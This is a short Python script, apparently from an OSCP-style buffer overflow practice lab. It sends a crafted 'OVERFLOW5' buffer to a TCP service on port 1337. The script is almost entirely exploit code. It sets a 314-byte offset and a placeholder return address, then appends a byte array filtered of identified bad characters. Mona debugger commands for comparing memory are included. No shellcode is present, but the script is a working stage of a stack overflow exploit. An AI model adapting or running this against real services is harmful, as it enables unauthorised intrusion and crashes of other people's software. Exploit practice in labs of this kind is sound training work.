"""
!mona bytearray -b "\x00"
!mona compare -f C:\mona\oscp\bytearray.bin -a 01A9FA30
"""

import socket,sys

ip = sys.argv[1] if sys.argv[1] else "10.10.11.248"
port = 1337

prefix = b"OVERFLOW5 "
offset = 314
overflow = b"A" * offset
retn = b"BBBB"
padding = b""

ESP="0189FA30"

bad_chars = {0,0x16,0x2f,0xf4,0xfd}
payload = b''.join([bytes([i]) for i in range(0,256) if i not in bad_chars])
postfix = b""
print('!mona bytearray -b "{}"'.format("".join([ "\\x%0.2X" % c for c in bad_chars])))
buffer = prefix + overflow + retn + padding + payload + postfix
print("---")
try:
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)	
  s.connect((ip, port))
  # print("Sending evil buffer...")
  s.send(buffer + b"\r\n")
  print("Done!")
except Exception as e:
  print(e)
  print("Could not connect.")
